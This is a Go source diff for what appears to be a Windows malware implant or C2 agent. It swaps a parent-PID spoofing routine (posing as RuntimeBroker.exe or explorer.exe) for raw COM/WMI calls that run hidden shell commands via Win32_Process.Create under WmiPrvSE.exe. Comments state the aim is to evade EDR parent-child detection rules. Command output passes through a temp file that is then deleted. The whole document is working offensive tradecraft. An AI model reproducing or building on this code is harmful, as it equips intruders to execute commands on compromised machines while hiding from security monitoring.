@@ -7,7 +7,6 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
-	"strings"
 	"syscall"
 	"time"
 	"unsafe"
@@ -19,6 +18,14 @@ var (
 	procCreateProcessWithTokenW2 = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessWithTokenW")
 	procCreateProcessAsUserW2    = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessAsUserW")
 	procDeleteFileA2             = windows.NewLazySystemDLL("kernel32.dll").NewProc("DeleteFileA")
+
+	// WMI COM procs (ole32.dll) — used by runShellOpsec
+	wmiOle32           = windows.NewLazySystemDLL("ole32.dll")
+	procCoInitializeEx = wmiOle32.NewProc("CoInitializeEx")
+	procCoInitSecurity = wmiOle32.NewProc("CoInitializeSecurity")
+	procCoCreateInst   = wmiOle32.NewProc("CoCreateInstance")
+	procCoSetProxy     = wmiOle32.NewProc("CoSetProxyBlanket")
+	procCoUninitialize = wmiOle32.NewProc("CoUninitialize")
 )
 
 func winErrno(err error) uint32 {
@@ -229,84 +236,181 @@ func enableTokenPrivilege(token windows.Handle, name string) error {
 	return nil
 }
 
-// findSpoofParent returns a handle to RuntimeBroker.exe or explorer.exe opened
-// with PROCESS_CREATE_PROCESS so it can be used as a PPID spoof target.
-func findSpoofParent() (windows.Handle, error) {
-	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
-	if err != nil {
-		return 0, err
-	}
-	defer windows.CloseHandle(snap)
-
-	var pe windows.ProcessEntry32
-	pe.Size = uint32(unsafe.Sizeof(pe))
-	if err := windows.Process32First(snap, &pe); err != nil {
-		return 0, err
-	}
-
-	const PROCESS_CREATE_PROCESS = 0x0080
-	var runtimeBroker, explorer windows.Handle
-	for {
-		name := windows.UTF16ToString(pe.ExeFile[:])
-		if strings.EqualFold(name, "RuntimeBroker.exe") {
-			h, err := windows.OpenProcess(PROCESS_CREATE_PROCESS, false, pe.ProcessID)
-			if err == nil {
-				runtimeBroker = h
-				break
-			}
-		} else if strings.EqualFold(name, "explorer.exe") && explorer == 0 {
-			h, err := windows.OpenProcess(PROCESS_CREATE_PROCESS, false, pe.ProcessID)
-			if err == nil {
-				explorer = h
-			}
-		}
-		if err := windows.Process32Next(snap, &pe); err != nil {
-			break
-		}
-	}
-
-	if runtimeBroker != 0 {
-		if explorer != 0 {
-			windows.CloseHandle(explorer)
-		}
-		return runtimeBroker, nil
-	}
-	if explorer != 0 {
-		return explorer, nil
-	}
-	return 0, fmt.Errorf("no suitable PPID spoof parent found")
+// wmiVariant is a minimal Go representation of Windows VARIANT (16 bytes on x64).
+// Layout matches: vt(2) + reserved(6) + value-union(8).
+type wmiVariant struct {
+	vt  uint16
+	_   [6]byte
+	val uintptr
 }
 
-// runShellOpsec runs cmd via cmd.exe spoofing the parent PID to RuntimeBroker.exe
-// or explorer.exe so the cmd.exe process appears as a child of a legitimate process.
+// wmiGUID holds a Windows GUID in the wire format used by CoCreateInstance.
+type wmiGUID struct {
+	data1 uint32
+	data2 uint16
+	data3 uint16
+	data4 [8]byte
+}
+
+var (
+	wmiClsidLocator = wmiGUID{0x4590f811, 0x1d3a, 0x11d0, [8]byte{0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}}
+	wmiIidLocator   = wmiGUID{0xdc12a687, 0x737f, 0x11cf, [8]byte{0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}}
+)
+
+// wmiCall dispatches a COM vtable method at index idx on the COM object at ptr.
+// It is identical to clrVtblCall but with uintptr return for pointer-out paths.
+func wmiCall(ptr uintptr, idx int, args ...uintptr) uintptr {
+	if ptr == 0 {
+		return 0x80004003 // E_POINTER
+	}
+	vtbl := *(*uintptr)(unsafe.Pointer(ptr))
+	fn := *(*uintptr)(unsafe.Pointer(vtbl + uintptr(idx)*8))
+	all := make([]uintptr, 0, 1+len(args))
+	all = append(all, ptr)
+	all = append(all, args...)
+	r, _, _ := syscall.SyscallN(fn, all...)
+	return r
+}
+
+// wmiRelease calls IUnknown::Release (vtbl[2]) on a COM object and zeros ptr.
+func wmiRelease(ptr *uintptr) {
+	if ptr != nil && *ptr != 0 {
+		wmiCall(*ptr, 2)
+		*ptr = 0
+	}
+}
+
+// wmiCreateProcess uses WMI Win32_Process.Create to spawn cmdLine as a child of
+// WmiPrvSE.exe, avoiding any PROCESS_CREATE_PROCESS handle or attribute list.
+// Returns the PID of the spawned process, or 0 on failure.
+func wmiCreateProcess(cmdLine string) uint32 {
+	bstrOf := func(s string) uintptr {
+		ws, _ := syscall.UTF16PtrFromString(s)
+		r, _, _ := sysAllocString.Call(uintptr(unsafe.Pointer(ws)))
+		return r
+	}
+	freeBSTR := func(b *uintptr) {
+		if b != nil && *b != 0 {
+			sysFreeString.Call(*b)
+			*b = 0
+		}
+	}
+
+	// CoInitializeEx(NULL, COINIT_MULTITHREADED=0)
+	r, _, _ := procCoInitializeEx.Call(0, 0)
+	if r != 0 && r != 0x80010106 { // S_OK or RPC_E_CHANGED_MODE
+		return 0
+	}
+	procCoInitSecurity.Call(0, uintptr(0xFFFFFFFF), 0, 0, 6, 3, 0, 0, 0)
+	defer procCoUninitialize.Call()
+
+	// CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER=1, IID_IWbemLocator, &pLoc)
+	var pLoc uintptr
+	r, _, _ = procCoCreateInst.Call(
+		uintptr(unsafe.Pointer(&wmiClsidLocator)), 0, 1,
+		uintptr(unsafe.Pointer(&wmiIidLocator)),
+		uintptr(unsafe.Pointer(&pLoc)),
+	)
+	if r != 0 || pLoc == 0 {
+		return 0
+	}
+	defer wmiRelease(&pLoc)
+
+	// IWbemLocator::ConnectServer [vtbl 3] → IWbemServices
+	bsNS := bstrOf(`ROOT\CIMV2`)
+	defer freeBSTR(&bsNS)
+	var pSvc uintptr
+	r = wmiCall(pLoc, 3, bsNS, 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&pSvc)))
+	if r != 0 || pSvc == 0 {
+		return 0
+	}
+	defer wmiRelease(&pSvc)
+	procCoSetProxy.Call(pSvc, 10, 0, 0, 4, 3, 0, 0) // WINNT, NONE, CALL, IMPERSONATE
+
+	// IWbemServices::GetObject [vtbl 6] → Win32_Process class
+	bsCls := bstrOf("Win32_Process")
+	defer freeBSTR(&bsCls)
+	var pCls uintptr
+	r = wmiCall(pSvc, 6, bsCls, 0, 0, uintptr(unsafe.Pointer(&pCls)), 0)
+	if r != 0 || pCls == 0 {
+		return 0
+	}
+	defer wmiRelease(&pCls)
+
+	// IWbemClassObject::GetMethod [vtbl 20] → in-params class for "Create"
+	methW, _ := syscall.UTF16PtrFromString("Create")
+	var pInParam uintptr
+	r = wmiCall(pCls, 20, uintptr(unsafe.Pointer(methW)), 0,
+		uintptr(unsafe.Pointer(&pInParam)), 0)
+	if r != 0 || pInParam == 0 {
+		return 0
+	}
+	defer wmiRelease(&pInParam)
+
+	// IWbemClassObject::SpawnInstance [vtbl 16] → writable in-params instance
+	var pInst uintptr
+	r = wmiCall(pInParam, 16, 0, uintptr(unsafe.Pointer(&pInst)))
+	if r != 0 || pInst == 0 {
+		return 0
+	}
+	defer wmiRelease(&pInst)
+
+	// IWbemClassObject::Put [vtbl 5] — set CommandLine property (VT_BSTR=8)
+	propW, _ := syscall.UTF16PtrFromString("CommandLine")
+	bsCmdLine := bstrOf(cmdLine)
+	v := wmiVariant{vt: 8}
+	v.val = bsCmdLine
+	wmiCall(pInst, 5, uintptr(unsafe.Pointer(propW)), 0, uintptr(unsafe.Pointer(&v)), 0)
+	procVariantClear.Call(uintptr(unsafe.Pointer(&v)))
+
+	// IWbemServices::ExecMethod [vtbl 24] — call Win32_Process.Create
+	bsCls2 := bstrOf("Win32_Process")
+	bsMeth := bstrOf("Create")
+	defer freeBSTR(&bsCls2)
+	defer freeBSTR(&bsMeth)
+	var pOut uintptr
+	wmiCall(pSvc, 24, bsCls2, bsMeth, 0, 0, pInst, uintptr(unsafe.Pointer(&pOut)), 0)
+	defer wmiRelease(&pOut)
+
+	// IWbemClassObject::Get [vtbl 4] — read ProcessId from output object
+	if pOut == 0 {
+		return 0
+	}
+	pidW, _ := syscall.UTF16PtrFromString("ProcessId")
+	var vPid wmiVariant
+	wmiCall(pOut, 4, uintptr(unsafe.Pointer(pidW)), 0, uintptr(unsafe.Pointer(&vPid)), 0, 0)
+	var pid uint32
+	if vPid.vt == 3 || vPid.vt == 19 { // VT_I4 or VT_UI4
+		pid = uint32(vPid.val)
+	}
+	procVariantClear.Call(uintptr(unsafe.Pointer(&vPid)))
+	return pid
+}
+
+// runShellOpsec executes cmd via WMI Win32_Process.Create so the spawned process
+// is a child of WmiPrvSE.exe, not of this agent — evades parent-child EDR rules.
 func runShellOpsec(cmd string) string {
-	hParent, err := findSpoofParent()
-	if err != nil || hParent == 0 {
-		return shellDirect(cmd)
-	}
-	defer windows.CloseHandle(hParent)
-
 	uid := fmt.Sprintf("%08x%016x", os.Getpid(), time.Now().UnixNano())
-	outPath := `C:\Windows\Temp\sbo` + uid + `.tmp`
+	outPath := `C:\ProgramData\sbo` + uid + `.tmp`
+	cmdLine := `cmd.exe /d /c ` + cmd + ` > "` + outPath + `" 2>&1`
 
-	c := exec.Command("cmd.exe")
-	c.SysProcAttr = &windows.SysProcAttr{
-		CmdLine:       `/d /c ` + cmd + ` > "` + outPath + `" 2>&1`,
-		HideWindow:    true,
-		ParentProcess: syscall.Handle(hParent),
-	}
-	if err := c.Start(); err != nil {
+	pid := wmiCreateProcess(cmdLine)
+	if pid == 0 {
 		return shellDirect(cmd)
 	}
-	done := make(chan error, 1)
-	go func() { done <- c.Wait() }()
-	select {
-	case <-done:
-	case <-time.After(60 * time.Second):
-		c.Process.Kill()
-		<-done
+
+	h, e := windows.OpenProcess(windows.SYNCHRONIZE, false, pid)
+	if e == nil {
+		windows.WaitForSingleObject(h, 30000)
+		windows.CloseHandle(h)
+	} else {
+		time.Sleep(10 * time.Second)
 	}
+
 	data, _ := os.ReadFile(outPath)
 	_ = os.Remove(outPath)
+	if len(data) == 0 {
+		return shellDirect(cmd)
+	}
 	return string(data)
 }
